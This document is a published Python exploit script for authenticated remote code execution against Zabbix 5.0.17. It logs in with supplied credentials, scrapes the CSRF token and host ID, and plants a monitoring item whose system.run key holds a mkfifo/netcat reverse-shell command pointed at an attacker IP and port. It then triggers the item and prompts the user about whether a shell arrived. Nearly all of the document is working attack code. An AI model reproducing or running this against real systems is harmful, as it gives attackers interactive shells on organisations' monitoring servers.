# Exploit Title: Zabbix 5.0.17 - Remote Code Execution (RCE) (Authenticated)
# Date: 9/3/2022
# Exploit Author: Hussien Misbah
# Vendor Homepage: https://www.zabbix.com/
# Software Link: https://www.zabbix.com/rn/rn5.0.17
# Version: 5.0.17
# Tested on: Linux
# Reference: https://github.com/HussienMisbah/tools/tree/master/Zabbix_exploit

#!/usr/bin/python3
# note : this is blind RCE so don't expect to see results on the site
# this exploit is tested against Zabbix 5.0.17 only

import sys
import requests
import re
import random
import string
import colorama
from colorama import Fore


print(Fore.YELLOW+"[*] this exploit is tested against Zabbix 5.0.17 only")
print(Fore.YELLOW+"[*] can reach the author @ https://hussienmisbah.github.io/")


def item_name() :
    letters = string.ascii_letters
    item =  ''.join(random.choice(letters) for i in range(20))
    return item

if len(sys.argv) != 6 :
    print(Fore.RED +"[!] usage : ./expoit.py <target url>  <username> <password> <attacker ip> <attacker port>")
    sys.exit(-1)

url  = sys.argv[1]
username =sys.argv[2]
password = sys.argv[3]
host = sys.argv[4]
port = sys.argv[5]


s = requests.Session()


headers ={
"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
}

data = {
"request":"hosts.php",
"name"  : username ,
"password" : password ,
"autologin" :"1" ,
"enter":"Sign+in"
}


proxies = {
   'http': 'http://127.0.0.1:8080'
}


r = s.post(url+"/index.php",data=data)  #proxies=proxies)

if "Sign out" not in r.text :
    print(Fore.RED +"[!] Authentication failed")
    sys.exit(-1)
if "Zabbix 5.0.17" not in r.text :
    print(Fore.RED +"[!] This is not Zabbix 5.0.17")
    sys.exit(-1)

if "filter_hostids%5B0%5D=" in r.text :
    try :
        x = re.search('filter_hostids%5B0%5D=(.*?)"', r.text)
        hostId = x.group(1)
    except :
        print(Fore.RED +"[!] Exploit failed to resolve HostID")
        print(Fore.BLUE +"[?] you can find it under /items then add item")
        sys.exit(-1)
else :
    print(Fore.RED +"[!] Exploit failed to resolve HostID")
    print(Fore.BLUE +"[?] you can find HostID under /items then add item")
    sys.exit(-1)


sid= re.search('<meta name="csrf-token" content="(.*)"/>',r.text).group(1) # hidden_csrf_token


command=f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {host} {port}  >/tmp/f"

payload = f"system.run[{command},nowait]"
Random_name = item_name()
data2 ={

"sid":sid,"form_refresh":"1","form":"create","hostid":hostId,"selectedInterfaceId":"0","name":Random_name,"type":"0","key":payload,"url":"","query_fields[name][1]":"","query_fields[value][1]":"","timeout":"3s","post_type":"0","posts":"","headers[name][1]":"","headers[value][1]":"","status_codes":"200","follow_redirects":"1","retrieve_mode":"0","http_proxy":"","http_username":"","http_password":"","ssl_cert_file":"","ssl_key_file":"","ssl_key_password":"","interfaceid":"1","params_es":"","params_ap":"","params_f":"","value_type":"3","units":"","delay":"1m","delay_flex[0][type]":"0","delay_flex[0][delay]":"","delay_flex[0][schedule]":"","delay_flex[0][period]":"","history_mode":"1","history":"90d","trends_mode":"1","trends":"365d","valuemapid":"0","new_application":"","applications[]":"0","inventory_link":"0","description":"","status":"0","add":"Add"
}

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"} )


no_pages= r2.text.count("?page=")

#################################################[Searching in all pages for the uploaded item]#################################################
page = 1
flag=False
while page <= no_pages :
    r_page=s.get(url+f"/items.php?page={page}" ,headers=headers )
    if  Random_name in r_page.text :
        print(Fore.GREEN+"[+] the payload has been Uploaded Successfully")
        x2 = re.search(rf"(\d+)[^\d]>{Random_name}",r_page.text)
        try :
            itemId=x2.group(1)
        except :
            pass

        print(Fore.GREEN+f"[+] you should find it at {url}/items.php?form=update&hostid={hostId}&itemid={itemId}")
        flag=True
        break

    else :
        page +=1

if flag==False :
        print(Fore.BLUE +"[?] do you know you can't upload same key twice ?")
        print(Fore.BLUE +"[?] maybe it is already uploaded so set the listener and wait 1m")
        print(Fore.BLUE +"[*] change the port and try again")
        sys.exit(-1)

#################################################[Executing the item]#################################################


data2["form"] ="update"
data2["selectedInterfaceId"] = "1"
data2["check_now"]="Execute+now"
data2.pop("add",None)
data2["itemid"]=itemId,

print(Fore.GREEN+f"[+] set the listener at {port} please...")

r2 =s.post(url+"/items.php" ,data=data2,headers=headers,cookies={"tab":"0"}) # ,proxies=proxies )

print(Fore.BLUE+ "[?] note : it takes up to +1 min so be patient :)")
answer =input(Fore.BLUE+"[+] got a shell ? [y]es/[N]o: ")

if "y" in answer.lower() :
    print(Fore.GREEN+"Nice !")
else :
    print(Fore.RED+"[!] if you find out why please contact me ")

sys.exit(0)